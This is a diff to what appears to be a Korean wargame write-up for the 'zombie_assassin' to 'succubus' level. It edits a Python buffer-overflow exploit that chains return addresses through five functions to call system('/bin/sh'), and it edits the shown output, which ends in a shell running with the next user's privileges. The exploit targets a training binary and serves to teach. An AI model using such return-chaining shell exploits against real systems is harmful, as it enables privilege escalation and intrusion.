@@ -266,13 +266,12 @@ payload 시나리오 :
 
 ```
 [zombie_assassin@localhost zombie_assassin]$ python ex.py
-릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?♦펶뙁\?$?릱릱H??bin/bash
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?♦펶뙁\?$?릱릱X??bin/sh
 welcome to the DO!
 welcome to the GYE!
 welcome to the GUL!
 welcome to the YUT!
 welcome to the MO!
-bash: /home/zombie_assassin/.bashrc: Permission denied
 bash$ id
 uid=516(zombie_assassin) gid=516(zombie_assassin) euid=517(succubus) egid=517(succubus) groups=516(zombie_assassin)
 bash$ my-pass
@@ -292,15 +291,12 @@ append = lambda x: payload + x
 p32 = lambda x: struct.pack("<I", x)
 
 target = "/home/zombie_assassin/succubus"
-#target = "/home/zombie_assassin/auccubus"
 
 DO_addr = 0x80487ec
 GYE_addr = 0x80487bc
 GUL_addr = 0x804878c
 YUT_addr = 0x804875c
 MO_addr = 0x8048724
-
-padding = 0x90909090
 
 binsh_addr = 0xbffffa88
 
@@ -310,9 +306,9 @@ payload = append(p32(GYE_addr))		# DO ret
 payload = append(p32(GUL_addr))		# GYE ret
 payload = append(p32(YUT_addr)) 	# GUL ret
 payload = append(p32(MO_addr))		# YUT ret
-payload = append(p32(padding))		# MO ret
+payload = append("AAAA")			# MO ret
 payload = append(p32(binsh_addr))	# system arg
-payload = append("/bin/bash")
+payload = append("/bin/sh")
 
 pid = os.fork()
 
